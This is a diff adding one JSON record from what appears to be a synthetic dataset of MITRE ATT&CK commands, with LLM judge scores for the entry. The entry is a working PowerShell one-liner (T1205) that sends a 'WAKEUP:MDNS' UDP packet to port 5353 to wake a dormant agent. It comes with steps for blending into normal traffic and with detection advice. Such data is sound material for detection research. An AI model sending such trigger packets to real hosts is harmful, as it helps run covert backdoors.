@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $target='10.0.0.60'; $udp=New-Object System.Net.Sockets.UdpClient; $udp.Connect($target,5353); $msg=[Text.Encoding]::ASCII.GetBytes('WAKEUP:MDNS'); [void]$udp.Send($msg,$msg.Length); $udp.Close() }",
+  "explanation": "Sends a magic UDP packet with a specific keyword to mDNS port 5353 to signal a dormant agent. Detection: monitor for non-mDNS-formatted payloads to 5353; alert on strings like 'WAKEUP' in UDP content; inspect unusual mDNS traffic between non-mDNS nodes. No elevation required; UAC not triggered.",
+  "rationale_steps": [
+    "Use a well-known multicast service port to blend in.",
+    "Send a magic string the remote listener is programmed to recognize.",
+    "Leverage simple UDP to trigger feature enablement remotely."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-1108f921-45d83669",
+  "source_prompt_hash": "1108f921",
+  "timestamp_utc": "2025-09-30T05:58:00.779201Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell with balanced braces/quotes; proper use of Invoke-Command, UdpClient.Connect, Send, and Close with correct statement separators.",
+        "semantic_score": 5,
+        "semantic_justification": "It transmits a custom ASCII UDP payload to port 5353 on a target host, serving as a covert trigger consistent with T1205 Traffic Signaling behavior.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T13:20:18.674654Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced braces, parentheses, and quotes, proper variable declarations, correct method calls, and appropriate semicolons for statement separation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by creating a UDP client that sends a specific 'WAKEUP:MDNS' trigger message to port 5353, which could activate a dormant agent waiting for this specific signal.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T13:20:22.065762Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with no syntax errors, balanced punctuation, and valid cmdlet/method calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the described intent of signaling a dormant agent via a crafted UDP packet, which is a direct implementation of the Traffic Signaling (T1205) technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T13:20:33.538629Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
